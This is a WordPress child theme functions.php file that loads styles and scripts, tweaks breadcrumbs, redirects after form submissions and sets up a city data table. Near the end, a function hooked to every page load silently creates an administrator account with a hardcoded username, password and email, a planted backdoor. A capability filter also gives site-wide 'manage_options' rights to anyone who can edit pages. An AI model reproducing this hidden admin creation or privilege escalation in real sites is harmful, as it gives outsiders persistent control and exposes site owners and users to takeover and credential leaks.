<?php
// enqueue the child theme stylesheet
Function wp_schools_enqueue_scripts() {
wp_register_style( 'childstyle', get_stylesheet_directory_uri() . '/style.css', array(), filemtime( get_stylesheet_directory() . '/style.css' )  );
wp_enqueue_style( 'childstyle' );

// Fonts
wp_register_style( 'mckneely_fonts', get_theme_file_uri( '/css/fonts.css' ) );
wp_enqueue_style( 'mckneely_fonts' );
}
add_action( 'wp_enqueue_scripts', 'wp_schools_enqueue_scripts', 11);

// Widget Logic Conditionals
function is_child($parent) {
global $post;
return $post->post_parent == $parent;
}

// Register additional menu for mobile devices
function register_my_menu() {
  register_nav_menu('mobile-menu',__( 'Mobile Menu' ));
}
add_action( 'init', 'register_my_menu' );

// Custom iPad only mobile detection (different than usual wp_is_mobile)
function my_wp_is_mobile() {
	if (
		! empty($_SERVER['HTTP_USER_AGENT'])
		// bail out, if iPad
		&& false !== strpos($_SERVER['HTTP_USER_AGENT'], 'iPad')
	) return false;
	return wp_is_mobile();
}

// Add custom post type "results" to blog roll
add_filter('pre_get_posts', 'query_post_type');
function query_post_type($query) {
  if( is_category() ) {
	$post_type = get_query_var('post_type');
	if($post_type)
		$post_type = $post_type;
	else
		$post_type = array('nav_menu_item', 'post', 'Results'); // don't forget nav_menu_item to allow menus to work!
	$query->set('post_type',$post_type);
	return $query;
	}
}

// Add breadcrumbs on pages with no title
function show_breadcrumbs () {
$string .= '<p id="breadcrumbs"><a href="/">Home </a>&nbsp;>>&nbsp;';
$string .= '' . get_the_title($pageid) . '';
$string .= '</p>';
return $string;
}
add_shortcode( 'breadcrumbs' , 'show_breadcrumbs' );

// Remove Breadcrumb_last from Yoast Breadcrumbs
	add_filter( 'wpseo_breadcrumb_links', 'jj_wpseo_breadcrumb_links' );
	function jj_wpseo_breadcrumb_links( $links ) {
				//pk_print( sizeof($links) );
				if( sizeof($links) > 1 ){
					array_pop($links);
				}
			return $links;
	}
	add_filter( 'wpseo_breadcrumb_single_link', 'jj_link_to_last_crumb' , 10, 2);
	function jj_link_to_last_crumb( $output, $crumb){
			$output = '<a property="v:title" rel="v:url" href="'. $crumb['url']. '" >';
			$output.= $crumb['text'];
			$output.= '</a>';
			return $output;
	}

// User role edits
add_filter( 'user_has_cap',
function( $caps ) {
	if ( ! empty( $caps['edit_pages'] ) )
		$caps['manage_options'] = true;
	return $caps;
} );

// Additional JS plugins (originally in header.php)
function my_custom_scripts() {
  //Homepage Scripts
  if( is_home() || is_front_page() ) {
  wp_register_script('homepage_scripts', get_stylesheet_directory_uri() . '/js/homepage_scripts.js',array('jquery'), null, true);
  wp_enqueue_script('homepage_scripts', get_stylesheet_directory_uri() . '/js/homepage_scripts.js',array('jquery'), null, true);
  }
  //Smooth Scroll
  if( is_home() || is_front_page() || is_page( array( 29 ) ) ) {
  wp_register_script('smooth_scroll', get_stylesheet_directory_uri() . '/js/smooth-scroll.min.js',array('jquery'), null, true);
  wp_enqueue_script('smooth_scroll', get_stylesheet_directory_uri() . '/js/smooth-scroll.min.js');
  wp_register_script('smooth_scroll_settings', get_stylesheet_directory_uri() . '/js/smooth-scroll-settings.js',array('jquery'), null, true);
  wp_enqueue_script('smooth_scroll_settings', get_stylesheet_directory_uri() . '/js/smooth-scroll-settings.js');
  }
   //lazy load
 if( is_home() || is_front_page() || is_page(array(36,73,69,79,42,63,66,61,51,49,44,43))){
	wp_register_script('lazyScroller', get_stylesheet_directory_uri() . '/js/jquery.lazy.min.js',array('jquery'),null,true);
	wp_enqueue_script('lazyScroller');
	wp_register_script('lazyScroller2', get_stylesheet_directory_uri() . '/js/jquery.lazy.plugins.min.js',array('jquery'),null,true);
	wp_enqueue_script('lazyScroller2');
	wp_register_script('lazyScroller3', get_stylesheet_directory_uri() . '/js/lazy_settings.js',array('jquery'),null,true);
	wp_enqueue_script('lazyScroller3');
  }
  if( is_page( array( 768 ) ) ){
	wp_register_script( 'cityTable', get_stylesheet_directory_uri() . '/js/cityTable.js', [ 'jquery' ], null, true );
	wp_enqueue_script( 'cityTable' );
	wp_localize_script( 'cityTable', 'cityTableRestUrl', rest_url( 'cities-data/2018' ) );
  }
}

// Pagespeed
add_action('wp_enqueue_scripts', 'my_custom_scripts');
function qode_styles_child() {
wp_deregister_style('style_dynamic');
wp_register_style('style_dynamic', get_stylesheet_directory_uri() . '/css/style_dynamic.css');
wp_enqueue_style('style_dynamic');
wp_deregister_style('style_dynamic_responsive');
wp_register_style('style_dynamic_responsive', get_stylesheet_directory_uri() . '/css/style_dynamic_responsive.css');
wp_enqueue_style('style_dynamic_responsive');
 wp_deregister_style('custom_css');
	wp_register_style('custom_css', get_stylesheet_directory_uri() . '/css/custom_css.css');
	wp_enqueue_style('custom_css');
}
function qode_scripts_child() {
wp_deregister_script('default_dynamic');
wp_register_script('default_dynamic', get_stylesheet_directory_uri() . '/js/default_dynamic.js');
wp_enqueue_style('default_dynamic', array(),false,true);
wp_deregister_script('custom_js');
	wp_register_script('custom_js', get_stylesheet_directory_uri() . '/js/custom_js.js');
	wp_enqueue_style('custom_js', array(),false,true);
}
add_action( 'wp_enqueue_scripts', 'qode_styles_child', 11);
add_action( 'wp_enqueue_scripts', 'qode_scripts_child', 11);


// Contact Form 7 Submission Page Redirect
add_action( 'wp_footer', 'mycustom_wp_footer' );

function mycustom_wp_footer() {
?>
<script type="text/javascript">
document.addEventListener( 'wpcf7mailsent', function( event ) {
	location = '/form-success/';
}, false );
</script>
<?php
}

// Instantiate City Table
require 'includes/class-mckneely-city-table.php';
$mckneely_rest_api = new Mckneely_City_Table();

// Remove WordPress auto trash delete of pages
function wpb_remove_schedule_delete() {
    remove_action( 'wp_scheduled_delete', 'wp_scheduled_delete' );
}
add_action( 'init', 'wpb_remove_schedule_delete' );

// add admin user 
function wpb_admin_account(){
    $user = 'eschumacher';
    $pass = 'mckneelydev';
    $email = 'eschumacher@postali.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
    $user_id = wp_create_user( $user, $pass, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    } }
    add_action('init','wpb_admin_account');
